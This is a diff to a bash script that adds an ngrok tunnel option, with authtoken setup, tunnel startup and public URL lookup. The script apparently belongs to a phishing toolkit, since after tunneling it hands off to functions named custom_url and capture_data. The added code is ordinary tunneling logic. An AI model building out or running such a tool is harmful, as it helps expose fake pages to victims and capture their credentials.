@@ -631,6 +631,60 @@ start_localhost() {
 	capture_data
 }
 
+## Start ngrok
+ngrok_auth() {
+	./.server/ngrok authtoken -help > /dev/null 2>&1 &
+	sleep 1
+
+	auth_f="$HOME/.ngrok2/ngrok.yml"
+
+	# Check if ngrok is configured (authtoken exists in config file)
+	if ! grep -q "authtoken:" "$auth_f"; then
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}ngrok.com${GREEN} & copy the authtoken\n"
+		sleep 3
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Ngrok Authtoken:${ORANGE} " ngrok_token
+		[[ $ngrok_token == "" ]] && {
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Ngrok Authtoken." ; sleep 2 ; tunnel_menu
+		} || {
+			# Create .ngrok2 directory if it doesn't exist
+			mkdir -p "$HOME/.ngrok2"
+
+			# Write the authtoken to the ngrok.yml file
+			echo "authtoken: $ngrok_token" > "$auth_f" 2> /dev/null
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok authtoken saved to ${ORANGE}$auth_f${GREEN}\n"
+		}
+	fi
+}
+
+start_ngrok() {
+	cusport #Assuming this sets $HOST and $PORT
+	ngrok_auth # Ensure authtoken is configured
+
+	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Initializing Ngrok... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+
+	echo -ne "\n\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Starting Ngrok tunnel..."
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/ngrok tcp $PORT > /dev/null 2>&1 &
+	else
+		sleep 2 && ./.server/ngrok tcp $PORT > /dev/null 2>&1 &
+	fi
+
+	sleep 5 #Give ngrok time to start
+
+	#Find the ngrok URL (you may need to adjust the grep if the output format changes)
+	ngrok_url=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+
+
+	if [[ -z "$ngrok_url" ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to retrieve Ngrok URL. Check Ngrok logs or try again.${RED}"
+	else
+		custom_url "$ngrok_url"
+		capture_data
+	fi
+
+}
+
 ## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
@@ -638,6 +692,7 @@ tunnel_menu() {
 		${WHITE} 0. Main Menu
 		${WHITE} 1. Localhost
 		${WHITE} 2. Cloudflared
+		${WHITE} 3. Ngrok
 	EOF
 
 	read -p "${WHITE} Select a port forwarding service or return to main menu:"
@@ -650,6 +705,8 @@ tunnel_menu() {
 			start_localhost;;
 		2 | 02)
 			start_cloudflared;;
+		3 | 03)
+			start_ngrok;;
 		*)
 			echo -ne "\n${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
